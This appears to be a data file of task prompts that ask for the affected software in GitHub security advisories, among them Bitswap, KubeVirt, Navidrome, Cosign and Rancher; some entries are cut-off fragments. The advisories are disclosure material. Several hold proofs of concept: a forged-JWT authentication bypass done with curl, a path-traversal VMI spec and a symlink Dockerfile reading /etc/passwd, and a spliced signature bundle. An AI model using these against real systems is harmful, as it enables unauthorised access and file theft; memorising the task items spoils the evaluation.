0.2.40 contains a patch.\n\n### Workarounds\nAvoid use of artifact server with `--artifact-server-path`.

Input: ### Impact\nAn attacker is able allocate arbitrarily many bytes in the Bitswap server by sending many `WANT_BLOCK` and or `WANT_HAVE` requests which are queued in an unbounded queue, with allocations that persist even if the connection is closed.\nThis affects users accepting untrusted connections with the Bitswap server, this also affects users using the old API stubs at `github.com/ipfs/boxo/bitswap` because it transitively uses `github.com/ipfs/boxo/bitswap/server`.\n\nWe have [renamed go-libipfs to boxo](https://github.com/ipfs/boxo/issues/215); this document uses both terms interchangeably. The version numbers for both are applicable, as they share the same historical timeline.\n\n### Remediation\nApply one of:\n- Update `boxo` to [`v0.6.0`](https://github.com/ipfs/boxo/releases/tag/v0.6.0) or later\n- Update `boxo` to [`v0.4.1`](https://github.com/ipfs/boxo/releases/tag/v0.4.1)\n   Note that ***`v0.5.0` is NOT safe***, `v0.4.1` is a backport of the `v0.6.0` security fixes on top of `v0.4.0`.\n\n### Mitigations\n1. The server now limits how many wantlist entries per peer it knows.\n    The `MaxQueuedWantlistEntriesPerPeer` option allows configuring how many wantlist entries the server remembers; if a peer sends a wantlist bigger than this (including a sum of multiple delta updates) the server will truncate the wantlist to the match the limit.\n    This defaults to `1024` entries per peer.\n2. The server now properly clears state about peers when they disconnect.\n    Peer state is more lazily allocated (only when a wantlist is received in the first place) and is properly cleared when the `PeerDisconnected` callback is received.\n3. The server now ignores CIDs above some size.\n    Clients were able to send any CID as long as the total protobuf message were bellow the 4MiB limit. This is allowed to allocate lots of memory with very little entries.\n    This can be configured using the `MaxCidSize` option and defaults to `168 bytes`.\n4. The server now closes the connection if an inline CID is requested (either as `WANT_*` or `CANCEL`).\n    The attack were more effective if done with CIDs that are present in target's blockstore, this is because this will push longer-lasting jobs on some priority queue.\n    Since inline CID are literal data (instead of hashes of data), everyone always \"has\" any inline CID (since instead of loading the data from disk, it can be extracted from the CID). It makes no sense for anyone to ever ask you about an inline CID since they could also just parse it themselves. Thus, as a defensive measure, we kill the connection with peers that ask about an inline CID.\n\n### Vulnerable symbols\n- `github.com/ipfs/go-libipfs/bitswap/server/internal/decision.(*Engine).MessageReceived`\n- `github.com/ipfs/go-libipfs/bitswap/server/internal/decision.(*Engine).NotifyNewBlocks`\n- `github.com/ipfs/go-libipfs/bitswap/server/internal/decision.(*Engine).findOrCreate`\n- `github.com/ipfs/go-libipfs/bitswap/server/internal/decision.(*Engine).PeerConnected`\n\n### Patches\n- https://github.com/ipfs/boxo/commit/9cb5cb54d40b57084d1221ba83b9e6bb3fcc3197 (mitigations 1 and 2)\n- https://github.com/ipfs/boxo/commit/62cbac40b96f49e39cd7fedc77ee6b56adce4916 (mitigations 3 and 4)\n- https://github.com/ipfs/boxo/commit/baa748b682fabb21a4c1f7628a8af348d4645974 (tests)\n\n### Workarounds\nIf you are using the stubs at `github.com/ipfs/go-libipfs/bitswap` and not taking advantage of the features provided by the server, refactoring your code to use the new split API will allow you to run in a client-only mode using: [`github.com/ipfs/boxo/bitswap/client`](https://pkg.go.dev/github.com/ipfs/boxo/bitswap/client)..

Please identify the software name affected by it. Input: ### Impact\n\nIf a malicious user gains control of a Kubernetes node running fluid csi pod (controlled by the `csi-nodeplugin-fluid` node-daemonset), he/she can leverage the fluid-csi service account to modify specs of all the nodes in the cluster. However, since this service account lacks \"list node\" permissions, the attacker may need to use other techniques to identify vulnerable nodes.\n\nOnce the attacker identifies and modifies the node specs, he/she can manipulate system-level-privileged components to access all secrets in the cluster or execute pods on other nodes. This allows he/she to elevate privileges beyond the compromised node and potentially gain full privileged access to the whole cluster.\n\nTo exploit this vulnerability, the attacker can make all other nodes unschedulable (for example, patch node with taints) and wait for system-critical components with high privilege to appear on the compromised node. However, this attack requires two prerequisites: a compromised node and identifying all vulnerable nodes through other means. Additionally, since the attack is passive and requires patience and luck, the severity of this finding is considered medium.\n\n### Patches\nFor users who're using version < 0.8.6, >= 0.7.0, upgrade to v0.8.6.\n\n### Workarounds\nDelete the `csi-nodeplugin-fluid` daemonset in `fluid-system` namespace and avoid using CSI mode to mount FUSE file systems. Alternatively using sidecar mode to mount FUSE file systems is recommended. Refer to [the doc](https://github.com/fluid-cloudnative/fluid/blob/master/docs/en/samples/knative.md) to get a full example of how to use sidecar mode.\n\n### References\n\n\nFixed by [Fix rbacs and limit CSI Plugin's node related access](https://github.com/fluid-cloudnative/fluid/commit/77c8110a3d1ec077ae2bce6bd88d296505db1550)\n\n### Credits\nSpecial thanks to the discoverers of this issue:\n\nNanzi Yang ([nzyang@stu.xidian.edu.cn](mailto:nzyang@stu.xidian.edu.cn))\n.

Please identify the software name affected by it. Input: ### Impact\n\nMutagen command line operations, as well as the log output from `mutagen daemon run`, are susceptible to control characters that could be provided by remote endpoints.  This can cause terminal corruption, either intentional or unintentional, if these characters are present in error messages, file paths/names, and/or log output.  This could be used as an attack vector if synchronizing with an untrusted remote endpoint, synchronizing files not under control of the user, or forwarding to/from an untrusted remote endpoint.  On very old systems with terminals susceptible to issues such as [CVE-2003-0069](https://nvd.nist.gov/vuln/detail/CVE-2003-0069), the issue could theoretically cause code execution.\n\n\n### Patches\n\nThe problem has been patched in Mutagen v0.16.6 and v0.17.1.  Earlier versions of Mutagen are no longer supported and will not be patched.  Versions of Mutagen after v0.18.0 will also have the patch merged.\n\nOne caveat is that the templating functionality of Mutagen's `list` and `monitor` commands has been only partially patched.  In particular, the `json` template function already provided escaping and no patching was necessary.  However, raw template output has been left unescaped because this raw output may be necessary for commands which embed Mutagen.  To aid these commands, a new `shellSanitize` template function has been added which provides control character neutralization in strings.\n\n\n### Workarounds\n\nAvoiding synchronization of untrusted files or interaction with untrusted remote endpoints should mitigate any risk.\n\n\n### References\n\nA similar issue can be seen in kubernetes/kubernetes#101695.\n.

Please identify the software name affected by it. Input: ### Impact\n\nMutagen projects offer shell-based execution functionality.  On Windows, the shell is resolved using the standard `%ComSpec%` mechanism, with a fallback to a `%PATH%`-based search for `cmd.exe`.  While this is the standard practice on Windows systems, it presents somewhat risky behavior.\n\nFirstly, `%ComSpec%` could, in theory, be set maliciously.  Unfortunately, there's not much that can be done to prevent this attack surface, because `%ComSpec%` is the official mechanism for shell specification on Windows.  We can, however, validate that it points to an absolute path, which one would expect for a properly set value.\n\nSecondly, a fallback to a relative `cmd.exe` path, resolved via `%PATH%`, could be risky.  The risk is largely mitigated by changes in Go 1.19 and later, but prior to that a malicious `cmd.exe` could been resolved in the current working directory.  To mitigate this issue, Mutagen now uses the `%SystemRoot%` environment variable (also validated to be an absolute path) to resolve `cmd.exe` in the event that `%ComSpec%` is not set correctly.\n\n\n### Patches\n\nThe problem has been patched in Mutagen v0.16.6 and v0.17.1. Earlier versions of Mutagen are no longer supported and will not be patched.

When nfpm packaged the files (without extra config for enforcing its own permissions) files could go out with bad permissions (chmod 666 or 777).\n\n### PoC\nCreate a default nfpm structure. \n\nWithin the test folder, create 3 files named `chmod-XXX.sh`. Each script has file \npermissions set corresponding with their file names (`chmod-777.sh` = `chmod 777`). Below each \nfile and permissions can be seen.\n\n```console\n$ ls -lart test \ntotal 24\n-rwxrwxrwx   1 user  group   11 May 19 13:15 chmod-777.sh\n-rw-rw-rw-   1 user  group   11 May 19 13:16 chmod-666.sh\ndrwxr-xr-x   5 user  group  160 May 19 13:19 .\n-rw-rw-r--   1 user  group   11 May 19 13:19 chmod-664.sh\ndrwxr-xr-x  10 user  group  320 May 19 13:29 ..\n```\n\nBelow is the snippet nfpm configuration file of the contents of the package. The test folder \nand files has no extra config for enforcing permissions. \n\n```yaml\ncontents:\n- src: foo-binary\n  dst: /usr/bin/bar\n- src: bar-config.conf\n  dst: /etc/foo-binary/bar-config.conf\n  type: config\n- src: test\n  dst: /etc/test/scripts\n```\n\nThe next step is to create a deb package.\n\n```console\n$ nfpm package -p deb # Create dep package\nusing deb packager...\ncreated package: foo_1.0.0_arm64.deb\n```\n\nWhen on a Ubuntu VM, install the foo package which was created\n\n```console\n$ sudo dpkg -i foo_1.0.0_arm64.deb # Installing deb package within Ubuntu\nSelecting previously unselected package foo.\n(Reading database ... 67540 files and directories currently installed.)\nPreparing to unpack foo_1.0.0_arm64.deb ...\nUnpacking foo (1.0.0) ...\nSetting up foo (1.0.0) ...\n```\n\nLooking at `/etc/test/scripts` and viewing the permissions.

This feature in nfpm would allow applying a global umask across any files being packaged, therefore, with the correct configuration, preventing world-writable files without needing to list permissions on each and every file in the package\n\n\n### Impact\n\nVulnerability is https://cwe.mitre.org/data/definitions/276.html\nhttps://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N\n\nAnyone using nfpm for creating packages and not checking/setting file permissions before packaging could result in bad permissions for files/folders..

This library function reads files within META-INF/ into memory without checking their sizes, resulting in an OOM if the uncompressed file is sufficiently large. Rekor is also not performing any such checks prior to passing the JAR to this library function.\n\n### Patches\nUsers should update to the latest version of Rekor, 1.1.1.\n\n### Workaround\nThere are no workarounds, users should update.\n\n## Vulnerability 2: OOM due to large .SIGN and .PKGINFO files in APK files.\n### Summary\nParsing of an APK file submitted to Rekor can cause an out of memory crash if the .SIGN or .PKGINFO files within the APK are sufficiently large.\n\n### Details\nWhen parsing an APK file, Rekor allocates byte slices to read both the .SIGN and .PKGINFO files into memory in order to verify the signature and hashes in the APK. These byte slices are allocated based on the size included in the tar header for each file, with no checks performed on that size. If the size in the header is sufficiently large, either because the uncompressed file is large or the size in the header has been artificially set to a large value, Rekor will crash due to an out of memory panic.\n\n### Patches\nUsers should update to the latest version of Rekor, 1.1.1.\n\n### Workaround\nThere are no workarounds, users should update..

If you use the code from the main branch, update at least to the commit after [f55a6552b006a381d9167e328808565dd2bf77dc](https://github.com/distribution/distribution/commit/f55a6552b006a381d9167e328808565dd2bf77dc).\n\n### Workarounds\n\nThere is no way to work around this issue without patching. Restrict access to the affected API endpoint: see the recommendations section.\n\n### References\n\n`/v2/_catalog` endpoint accepts a parameter to control the maximum amount of records returned (query string: `n`).\n\nWhen not given the default `n=100` is used.  The server trusts that `n` has an acceptable value, however when using a \nmaliciously large value, it allocates an array/slice of `n` of strings before filling the slice with data.\n\nThis behaviour was introduced ~7yrs ago [1].\n\n### Recommendation\n\nThe `/v2/_catalog` endpoint was designed specifically to do registry syncs with search or other API systems. Such an endpoint would create a lot of load on the backend system, due to overfetch required to serve a request in certain implementations.\n\nBecause of this, we strongly recommend keeping this API endpoint behind heightened privilege and avoiding leaving it exposed to the internet.\n\n###  For more information\n\nIf you have any questions or comments about this advisory:\n* Open an issue in [distribution repository](https://github.com/distribution/distribution)\n* Email us at [cncf-distribution-security@lists.cncf.io](mailto:cncf-distribution-security@lists.cncf.io)\n\n[1] [faulty commit](https://github.com/distribution/distribution/blob/b7e26bac741c76cb792f8e14c41a2163b5dae8df/registry/handlers/catalog.go#L45).

That made my whole server unresponsive.\n\nI assume the name comes from a docker container with that name, traefik itself:\n```\nlocalhost ~ # docker ps\nCONTAINER ID   IMAGE                                                   COMMAND                  CREATED             STATUS         PORTS                                                                                                NAMES\nd1414e74aec7   traefik:v2.10                                           \"/entrypoint.sh trae\u2026\"   4 minutes ago       Up 4 minutes   0.0.0.0:80->80/tcp, :::80->80/tcp, 0.0.0.0:443->443/tcp, :::443->443/tcp, 127.0.0.1:8080->8080/tcp   traefik.service\n```\n\n### PoC\n\n1.

Input: # /sys/devices/virtual/powercap accessible by default to containers\n\nIntel's RAPL (Running Average Power Limit) feature, introduced by the Sandy Bridge microarchitecture, provides software insights into hardware energy consumption. To facilitate this, Intel introduced the powercap framework in Linux kernel 3.13, which reads values via relevant MSRs (model specific registers) and provides unprivileged userspace access via `sysfs`. As RAPL is an interface to access a hardware feature, it is only available when running on bare metal with the module compiled into the kernel.\n\nBy 2019, it was realized that in some cases unprivileged access to RAPL readings could be exploited as a power-based side-channel against security features including AES-NI (potentially inside a SGX enclave) and KASLR (kernel address space layout randomization). Also known as the [PLATYPUS attack](https://platypusattack.com/), Intel assigned [CVE-2020-8694](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8694) and [CVE-2020-8695](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8695), and AMD assigned [CVE-2020-12912](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-12912).\n\nSeveral mitigations were applied; Intel reduced the sampling resolution via a microcode update, and the Linux kernel [prevents access by non-root users](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=949dd0104c496fa7c14991a23c03c62e44637e71) since 5.10. However, this kernel-based mitigation does not apply to many container-based scenarios:\n* Unless using user namespaces, root inside a container has the same level of privilege as root outside the container, but with a slightly more narrow view of the system\n* `sysfs` is mounted inside containers read-only; however only read access is needed to carry out this attack on an unpatched CPU\n\nWhile this is not a direct vulnerability in container runtimes, defense in depth and safe defaults are valuable and preferred, especially as this poses a risk to multi-tenant container environments. This is provided by masking `/sys/devices/virtual/powercap` in the default mount configuration, and adding an additional set of rules to deny it in the default AppArmor profile.\n\nWhile `sysfs` is not the only way to read from the RAPL subsystem, other ways of accessing it require additional capabilities such as `CAP_SYS_RAWIO` which is not available to containers by default, or `perf` paranoia level less than 1, which is a non-default kernel tunable.\n\n## References\n\n* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8694\n* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8695\n* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-12912\n* https://platypusattack.com/\n* https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=949dd0104c496fa7c14991a23c03c62e44637e71\n* https://web.eece.maine.edu/~vweaver/projects/rapl/.

Please identify the software name affected by it. Input: ### Summary\n\nA security vulnerability has been identified in navidrome's subsonic endpoint, allowing for authentication bypass. This exploit enables unauthorized access to any known account by utilizing a JSON Web Token (JWT) signed with the key \"not so secret\".\n\nThe vulnerability can only be exploited on instances that have never been restarted.\n\n### Details\n\nNavidrome supports an extension to the subsonic authentication scheme, where a JWT can be provided using a `jwt` query parameter instead of the traditional password or token and salt (corresponding to resp. the `p` or `t` and `s` query parameters).\n\nDuring the first initialization, navidrome generates a random key that is then used by the authentication module to validate JWTs before extracting the username from the `sub` claim. If for some reason the key cannot be retrieved by the initialization code, a hardcoded value is used instead: \"not so secret\".\n\nA bug in the order of operations during navidrome startup results in the authentication module initializing before the module responsible for generating and persisting the random key. As a consequence, the authentication module falls back to using the hardcoded value, which remains in use until the instance gets restarted. Additionally, an error that was meant to be logged when the fallback value is used does not get logged due to another bug, preventing the operator from becoming aware of the issue.\n\nThe flaw allows the creation of a JWT with the `sub` claim set to any existing user on the server, signed with the key \"not so secret\", which can then be used to authenticate against the subsonic endpoint with the chosen user's privileges.\n\nAfter navidrome is restarted, the random key generated during the previous startup is loaded and the flaw becomes inexploitable.\n\n### PoC\n\nGenerate a JWT token with the subject \"admin\", and key \"not so secret\" (e.g. online on: http://jwtbuilder.jamiekurtz.com; the other parameters can be left in, it doesn't seem that navidrome validates anything). In a shell, assign the token to the variable `JWT` (for the curl commands below).\n\n```\n$ podman run -d --name navidrome -p 127.0.0.1:4533:4533 -e ND_DEVAUTOCREATEADMINPASSWORD=password docker.io/deluan/navidrome:0.50.1\n$ curl \"http://localhost:4533/rest/ping.view?c=dummy&v=1&u=admin&jwt=$JWT\"\n<subsonic-response xmlns=\"http://subsonic.org/restapi\" status=\"ok\" version=\"1.16.1\" type=\"navidrome\" serverVersion=\"0.50.1 (f69c27d1)\" openSubsonic=\"true\"></subsonic-response>\n```\n\nThe `ND_DEVAUTOCREATEADMINPASSWORD` parameter does not influence the bypass, it also works if the admin or extra users are created manually after starting navidrome.\n\nRestarting navidrome prevents the bypass:\n\n```\n$ podman restart navidrome\n$ curl \"http://localhost:4533/rest/ping.view?c=dummy&v=1&u=admin&jwt=$JWT\"\n<subsonic-response xmlns=\"http://subsonic.org/restapi\" status=\"failed\" version=\"1.16.1\" type=\"navidrome\" serverVersion=\"0.50.1 (f69c27d1)\" openSubsonic=\"true\"><error code=\"40\" message=\"Wrong username or password\"></error></subsonic-response>\n```\n\n### Impact\n\nThis authentication bypass vulnerability potentially affects all instances that don't protect the subsonic endpoint `/rest/`, which is expected to be most instances in a standard deployment, and most instances in the reverse proxy setup too (as the documentation mentions to leave that endpoint unprotected).\n\nThe impact is limited by the fact that the flaw becomes inexploitable after a first restart, and the attacker needs to know the username of existing users on the instance.\n\nFor each known user, the attacker could mess with (create/delete/change) playlists, bookmarks, media annotations, shares (which are currently global) and radios. He is also able to get the user's email address (which is PII) with the `getUser` operation. And lastly he can use the media retrieval operations which could potentially affect the availability of the system.. Top 1 search result is go:github.com/navidrome/navidrome.

Please identify the software name affected by it. Input: ### Summary\nThe function `lookupPreprocess()` is meant to apply some transformations to a string by disabling characters in the regex `[-_ .]`. However, due to the use of late Unicode normalization of type NFKD, it is possible to bypass that validation and re-introduce all the characters in the regex `[-_ .]`. \n\n```go\n// lookupPreprocess applies transformations to s so that it can be compared\n// to search for something.\n// For example, it is used by (ThemeStore).Lookup\nfunc lookupPreprocess(s string) string {\n\treturn strings.ToLower(norm.NFKD.String(regexp.MustCompile(`[-_ .]`).ReplaceAllString(s, \"\")))\n}\n``` \n\nTake the following equivalent Unicode character U+2024 (\u2024). Initially, the `lookupPreprocess()` function would compile the regex and replace the regular dot (.). However, the U+2024 (\u2024) would bypass the `ReplaceAllString()`. When the normalization operation is applied to U+2024 (\u2024), the resulting character will be U+002E (.). Thus, the dot was reintroduced back.\n\n### Impact\n\nThe `lookupPreprocess()` can be easily bypassed with equivalent Unicode characters like U+FE4D (\ufe4d), which would result in the omitted U+005F (_), for instance. It should be noted here that the variable `s` is user-controlled data coming from [/cmd/ffcss/commands.go#L22-L28](https://github.com/ewen-lbh/ffcss/blob/master/cmd/ffcss/commands.go#L22-L28) the command args. The `lookupPreprocess()` function is only ever used to search for themes loosely (case insensitively, while ignoring dashes, underscores and dots), so the actual security impact is classified as low.\n\n### Remediation\n\nA simple fix would be to initially perform the Unicode normalization and then the rest of validations.\n\n### References\n\n - https://sim4n6.beehiiv.com/p/unicode-characters-bypass-security-checks\n.

Bob has either mistakenly or maliciously produced a signed a malicious version of the root metadata file where Alice's key is listed once with the keyid SHA2<sub>256</sub>K<sub>A</sub>, but his public key is listed twice, once with the keyid SHA2<sub>256</sub>K<sub>B</sub>, and the other with SHA2<sub>512</sub>K<sub>B</sub>. If Bob can convince Alice to mistakenly sign this root metadata file without noticing this error, then clients < 0.3.2 would mistakenly count the same signature from Bob twice, once with the keyid SHA2<sub>256</sub>K<sub>B</sub>, and the other with SHA2<sub>512</sub>K<sub>B</sub>.\n\n### Impact\n\nWhile the impact is potentially high, the severity is low as it requires either attackers or the repository (deliberately or mistakenly respectively) to have produced such an incorrect distribution of public keys, causing clients < 0.3.2 to fall prey to this issue.\n\n### Patches\n\nA fix is available for clients with versions >= [0.3.2](https://github.com/theupdateframework/go-tuf/releases/tag/v0.3.2).\n\n### Workarounds\n\nUsers can work around this vulnerability in previous clients by checking for and removing _duplicate_ public keys with different key IDs (e.g., SHA2-256 and SHA2-512 hashes of the same public key) in all signed metadata on their TUF repositories.\n\n### References\n\n* The PR fixing this issue is #369.\n* The [latest](https://theupdateframework.github.io/specification/v1.0.30/index.html#role-keyid) TUF specification advises using only SHA2-256 hashes of public keys.\n* Commit b383bafd27472310a650f3733e686163a868b71a removed support for clients generating multiple key IDs for the same public key. This commit is older than the first [v.0.1.0 tag](https://github.com/theupdateframework/go-tuf/releases/tag/v0.1.0) for go-tuf.\n* There is an outstanding [issue](https://github.com/theupdateframework/go-tuf/issues/368) for removing the non-standard `keyid_hash_algorithms` field in TUF metadata which arguably led to this issue.\n* A more robust solution is discussed (but not necessarily recommended) in [TAP 12](https://github.com/theupdateframework/taps/blob/master/tap12.md), which suggests deduplicating public keys even more strongly on the basis of the fundamental parameters (e.g., exponents) to the cryptosystem rather than specific encodings (e.g., PEM) of public keys.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Open an issue in [go-tuf](https://github.com/theupdateframework/go-tuf/issues)\n* Email us at TUF's [mailing list](mailto:theupdateframework@googlegroups.com)\n* The [#tuf](https://cloud-native.slack.com/archives/C8NMD3QJ3) channel on [CNCF Slack](https://slack.cncf.io/)..

Please identify the software name affected by it. Input: ### Impact\n\nUsers with the permission to create VMIs can construct VMI specs which allow them to read arbitrary files on the host. There are three main attack vectors:\n\n1. Some path fields on the VMI spec were not properly validated and allowed passing in relative paths which would have been mounted into the virt-launcher pod. The fields are: `spec.domain.firmware.kernelBoot.container.kernelPath`, `spec.domain.firmware.kernelBoot.container.initrdPath` as well as `spec.volumes[*].containerDisk.path`.\n\nExample:\n\n```yaml\napiVersion: [kubevirt.io/v1](http://kubevirt.io/v1)\nkind: VirtualMachineInstance\nmetadata:\n  name: vmi-fedora\nspec:\n  domain:\n    devices:\n      disks:\n      - disk:\n          bus: virtio\n        name: containerdisk\n      - disk:\n          bus: virtio\n        name: cloudinitdisk\n      - disk:\n          bus: virtio\n        name: containerdisk1\n      rng: {}\n    resources:\n      requests:\n        memory: 1024M\n  terminationGracePeriodSeconds: 0\n  volumes:\n  - containerDisk:\n      image: [quay.io/kubevirt/cirros-container-disk-demo:v0.52.0](http://quay.io/kubevirt/cirros-container-disk-demo:v0.52.0)\n    name: containerdisk\n  - containerDisk:\n      image: [quay.io/kubevirt/cirros-container-disk-demo:v0.52.0](http://quay.io/kubevirt/cirros-container-disk-demo:v0.52.0)\n      path: test3/../../../../../../../../etc/passwd\n    name: containerdisk1\n  - cloudInitNoCloud:\n      userData: |\n        #!/bin/sh\n        echo 'just something to make cirros happy'\n    name: cloudinitdisk\n```\n\n2. Instead of passing in relative links on the API, using malicious links in the containerDisk itself can have the same effect:\n\n```Dockerfile\nFROM <anybase>\nRUN mkdir -p /etc/ && touch /etc/passwd\nRUN mkdir -p /disks/ && ln -s /etc/passwd /disks/disk.img\n```\n\n3. KubeVirt allows PVC hotplugging. The hotplugged PVC is under user-control and it is possible to place absolute links there. Since containerDisk and hotplug code use the same mechanism to provide the disk to the virt-launcher pod, it can be used too to do arbitrary host file reads.\n\nIn all three cases it is then possible to at lest read any host file:\n\n```\n$ sudo cat /dev/vdc\nroot:x:0:0:root:/root:/bin/bash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nadm:x:3:4:adm:/var/adm:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\n[...]\n```\n\n\n### Patches\n\nKubeVirt 0.55.1 provides patches to fix the vulnerability.\n\n\n### Workarounds\n\n* Ensure that the `HotplugVolumes` feature-gate is disabled\n* ContainerDisk support can't be disabled. The only known way to mitigate this issue is create with e.g. policy controller a conditiontemplate which ensures that no containerDisk gets added and that `spec.domain.firmware.kernelBoot` is not used on VirtualMachineInstances.|\n* Ensure that SELinux is enabled. It blocks most attempts to read host files but does not provide a 100% guarantee (like vm-to-vm read may still work).\n\n### References\n\n\nDisclosure notice form the discovering party: https://github.com/google/security-research/security/advisories/GHSA-cvx8-ppmc-78hm\n\n### For more information\n\nFor interested vendors which have to provide a fix for their supported versions, the following PRs are providing the fix:\n\n * https://github.com/kubevirt/kubevirt/pull/8198\n * https://github.com/kubevirt/kubevirt/pull/8268\n \n### Credits\nOliver Brooks and James Klopchic of NCC Group\nDiane Dubois and Roman Mohr of Google\n.

Please identify the software name affected by it. Input: ## Summary\n\nA number of vulnerabilities have been found in `cosign verify-blob`, where Cosign would successfully verify an artifact when verification should have failed.\n\n## Vulnerability 1: Bundle mismatch causes invalid verification.\n\n### Summary\nA cosign bundle can be crafted to successfully verify a blob even if the embedded rekorBundle does not reference the given signature.\n\n### Details\nCosign supports \"bundles\" which intend to allow offline verification of the signature and rekor inclusion. By using the --bundle flag in cosign sign-blob, cosign will create a JSON file called a \"bundle\". These bundles include three fields: base64Signature, cert, and rekorBundle. The desired behavior is that the verification of these bundles would:\n\n- verify the provided blob using the included signature and certificate\n- verify the rekorBundle SET\n- verify the rekorBundle payload references the given artifact.\n\nIt appears that step three is not being performed, allowing \"any old rekorBundle\" to pass validation, even if the rekorBundle payload does not reference the provided blob or the certificate and signature in the rekorBundle do not match those at the top level.\n\n### Steps to reproduce\nEnable keyless signing:\n\n```\nexport COSIGN_EXPERIMENTAL=1\n```\nCreate two random blobs:\n```\ndd bs=1 count=50 </dev/urandom >blob1\ndd bs=1 count=50 </dev/urandom >blob2\n```\nSign each blob:\n```\ncosign sign-blob blob1 --bundle bundle1\ncosign sign-blob blob2 --bundle bundle2\n```\nCreate a falsified bundle including the base64Signature and cert fields from bundle1 and the rekorBundle from bundle2:\n```\njq --slurpfile bundle2 bundle2 '.rekorBundle = $bundle2[0].rekorBundle' bundle1 > invalidBundle\n```\nNow, the falsified bundle can be used to verify blob1:\n```\n$ cosign verify-blob blob1 --bundle invalidBundle\ntlog entry verified offline\nVerified OK\n```\n\n### Patches\n\nUsers should update to the latest version of Cosign, `1.12.0`.\n\n### Workaround\n\nIf you extract the signature and certificate from the `bundle`, you may use it for verification as follows and avoid using an invalid bundle:\n```\n$ cosign verify-blob blob1 --signature $(jq -r '.base64Signature' bundle1) --certificate $(jq -r '.cert' bundle1)\n```\n\nNote that this will make a network call to Rekor to fetch the Rekor entry. However, you may then be subject to Vulnerability 4.\n\n##  Vulnerability 2: Certificate Identities are not checked in some cases\n\n### Summary \n\nWhen providing identity flags, the email and issuer of a certificate is not checked when verifying a Rekor bundle, and the GitHub Actions identity is never checked.\n\n### Details\n\nUsers who provide an offline Rekor bundle (`--bundle`) when verifying a blob using `cosign verify-blob` and include flags that check identity such as `--certificate-email` and `--certificate-oidc-issuer` are impacted. Additionally, users who provide the GitHub Actions verification flags such as `--certificate-github-workflow-name` when running `cosign verify-blob` without a bundle, key reference, or certificate are impacted. \n\nWhen providing these flags, Cosign ignored their values. If a certificate's identity did not match the provided flags, Cosign would still successfully verify the blob.\n\n### Patches\n\nUsers should update to the latest version of Cosign, `1.12.0`.\n\n### Workarounds\n\nThere are no workarounds, users should update.\n\n##  Vulnerability 3: Invalid Rekor bundle without the experimental flag will result in successful verification\n\n### Summary\n\nProviding an invalid Rekor bundle without the experimental flag results in a successful verification.\n\n### Details\n\nUsers who provide an offline Rekor bundle (`--bundle`) that was invalid (invalid signed entry timestamp, expired certificate, or malformed) when verifying a blob with `cosign verify-blob` and do not set the `COSIGN_EXPERIMENTAL=1` flag are impacted.\n\nWhen an invalid bundle was provided, Cosign would fallback to checking Rekor log inclusion by requesting proof of inclusion from the log. However, without the `COSIGN_EXPERIMENTAL` flag, Cosign would exit early and successfully verify the blob. \n\n### Patches\n\nUsers should update to the latest version of Cosign, `1.12.0`.\n\n### Workarounds\n\nThere are no workarounds, users should update.\n\n##  Vulnerability 4: Invalid transparency log entry will result in successful verification\n\n### Summary\n\nAn invalid transparency log entry will result in immediate success for verification.\n\n### Details\n\nUsers who provide a signature and certificate to `verify-blob` will fetch the associated Rekor entry for verification. If the returned entry was invalid (invalid signed entry timestamp, invalid inclusion proof, malformed entry with missing verification), then `cosign` [exits](https://github.com/sigstore/cosign/blob/42c6e2a6dd9d92d19077c8e6b7d66d155a5ea28c/cmd/cosign/cli/verify/verify_blob.go#L357) early and succeeds unconditionally.\n\n### Patches\n\nUsers should update to the latest version of Cosign, `1.12.0`.\n\n### Workarounds\n\nThere are no workarounds, users should update.\n\n\n## For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [cosign](https://github.com/sigstore/cosign)\n* Send us a message on [Slack](https://sigstore.slack.com/).\n.

Please identify the software name affected by it. Input: ### Impact\nAn issue was discovered in Rancher versions up to and including 2.5.15 and 2.6.6 where sensitive fields, like passwords, API keys and Rancher's service account token (used to provision clusters), were stored in plaintext directly on Kubernetes objects like `Clusters`, for example `cluster.management.cattle.io`. Anyone with read access to those objects in the Kubernetes API could retrieve the plaintext version of those sensitive data.\n\nThe exposed credentials are visible in Rancher to authenticated `Cluster Owners`, `Cluster Members`, `Project Owners`, `Project Members` and `User Base` on the endpoints:\n- `/v1/management.cattle.io.catalogs`\n- `/v1/management.cattle.io.cluster`\n- `/v1/management.cattle.io.clustertemplates`\n- `/v1/management.cattle.io.notifiers`\n- `/v1/project.cattle.io.sourcecodeproviderconfig`\n- `/k8s/clusters/local/apis/management.cattle.io/v3/catalogs`\n- `/k8s/clusters/local/apis/management.cattle.io/v3/clusters`\n-  `/k8s/clusters/local/apis/management.cattle.io/v3/clustertemplates`\n- `/k8s/clusters/local/apis/management.cattle.io/v3/notifiers`\n- `/k8s/clusters/local/apis/project.cattle.io/v3/sourcecodeproviderconfigs`\n\nSensitive fields are now stripped from `Clusters` and other objects and moved to a `Secret` before the object is stored. The `Secret` is retrieved when the credential is needed. For objects that existed before this security fix, a one-time migration happens on startup.\n\n**Important:**\n- The exposure of Rancher's `serviceAccountToken` allows any standard user to escalate its privileges to cluster administrator in Rancher.\n- For the exposure of credentials not related to Rancher, the final impact severity for confidentiality, integrity and availability is dependent on the permissions that the leaked credentials have on their own services.\n\nThe fields that have been addressed by this security fix are:\n\n- `Notifier.SMTPConfig.Password`\n- `Notifier.WechatConfig.Secret`\n- `Notifier.DingtalkConfig.Secret`\n- `Catalog.Spec.Password`\n- `SourceCodeProviderConfig.GithubPipelineConfig.ClientSecret`\n- `SourceCodeProviderConfig.GitlabPipelineConfig.ClientSecret`\n- `SourceCodeProviderConfig.BitbucketCloudPipelineConfig.ClientSecret`\n- `SourceCodeProviderConfig.BitbucketServerPipelineConfig.PrivateKey`\n- 